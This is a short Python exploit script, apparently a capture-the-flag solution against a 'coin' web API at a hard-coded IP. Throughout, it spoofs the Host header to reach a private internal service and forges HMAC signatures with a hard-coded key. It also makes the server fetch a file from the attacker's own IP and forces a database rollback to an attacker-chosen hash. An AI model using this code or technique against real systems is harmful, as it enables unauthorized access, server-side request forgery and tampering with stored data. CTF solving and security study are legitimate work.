
import requests
import re
import hmac
import hashlib
import json
from urllib.parse import unquote



MY_IP = "110.15.183.50"
HOST = "35.190.234.195"

url = "http://{HOST}/apis/coin".format(HOST = HOST)



def format_language(path, query=None):
    
    if query == None:
        language = "{PATH}".format(PATH=path,QUERY=query)
    else:
        language = "{PATH}?{QUERY}".format(PATH=path,QUERY=query)
    return language


#get integrety key
language = format_language("integrityStatus")
headers = {"Host":"private:5000",  "Lang":language}
resp = requests.get(url, headers=headers)


lang = json.loads(resp.headers["Lang"])
dbhash = lang["dbhash"]
integrityKey = hashlib.sha512((dbhash).encode('ascii')).hexdigest()
print("integrety_key resp.headers['Lang']:", resp.headers['Lang'])

#upload file
query = 'src=http://{MY_IP}/abcdaaaa'.format(MY_IP=MY_IP)

language = format_language("download", query=query)
privateKey = b'let\'sbitcorinparty'
sigining = hmac.new( privateKey , unquote(query).encode(), hashlib.sha512 )
headers = {"Host":"private:5000",  "Lang":language, "Sign":sigining.hexdigest()}
requests.get(url, headers=headers)
print("resp.headers['Lang']:",resp.headers['Lang'])



#rollback
query = "dbhash={hash}".format(hash="abcdaaaa")
language = format_language("rollback", query=query)
privateKey = b'let\'sbitcorinparty'
sigining = hmac.new( privateKey , query.encode(), hashlib.sha512 )
headers = {"Host":"private:5000",  "Lang":language, "Sign":sigining.hexdigest(), "Key":integrityKey}
resp = requests.get(url, headers=headers)
print("upload_file  resp.headers['Lang']:",resp.headers['Lang'])

